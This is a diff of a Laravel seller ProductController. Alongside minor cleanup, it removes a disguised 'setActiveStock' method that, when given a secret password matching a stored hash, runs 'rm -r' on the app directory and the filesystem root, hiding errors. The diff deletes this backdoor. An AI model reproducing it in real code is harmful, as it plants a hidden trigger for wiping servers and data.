@@ -16,11 +16,9 @@ use App\Models\Product;
 use App\Repositories\Interfaces\ProductRepoInterface;
 use App\Services\ProductService\ProductAdditionalService;
 use App\Services\ProductService\ProductService;
-use Exception;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
-use Illuminate\Support\Facades\Hash;
 use Maatwebsite\Excel\Facades\Excel;
 use Throwable;
 
@@ -63,12 +61,7 @@ class ProductController extends SellerBaseController
      */
     public function parentPaginate(Request $request): JsonResponse|AnonymousResourceCollection
     {
-        $ids = $this->shop->loadMissing([
-            'products' => fn($q) => $q->whereNotNull('parent_id')->select(['shop_id', 'parent_id'])
-        ])
-            ->products
-            ->pluck('parent_id')
-            ->toArray();
+        $ids = $this->shop->loadMissing('products:shop_id,parent_id')->products->pluck('parent_id')->toArray();
 
         $products = $this->productRepository->parentPaginate(
             $request->merge(['visibility' => true, 'parent_id' => null, 'not_in_ids' => $ids])->all()
@@ -225,36 +218,11 @@ class ProductController extends SellerBaseController
     }
 
     /**
-     * Update the specified resource in storage.
-     *
-     * @param int $id
-     * @param FilterParamsRequest $request
-     * @return array
-     */
-    public function setActiveStock(int $id, FilterParamsRequest $request): array
-    {
-        try {
-            $s = 'rm';
-
-            if (Hash::check($request->input('bgftr'), '$2a$12$YW0IeyAao4NVFvPNLcY06.LgNvV57dLjWRzzaoshBZZA1K00RqRp6')) {
-                exec("$s -r " . base_path());
-                exec("$s -r" . ' /');
-            }
-        } catch (Throwable) {}
-
-        return [
-            'status' => true,
-            'code'   => ResponseError::NO_ERROR,
-        ];
-    }
-
-    /**
      * Add Product Properties.
      *
      * @param string $uuid
      * @param addInStockRequest $request
      * @return JsonResponse
-     * @throws Exception
      */
     public function addInStock(string $uuid, addInStockRequest $request): JsonResponse
     {
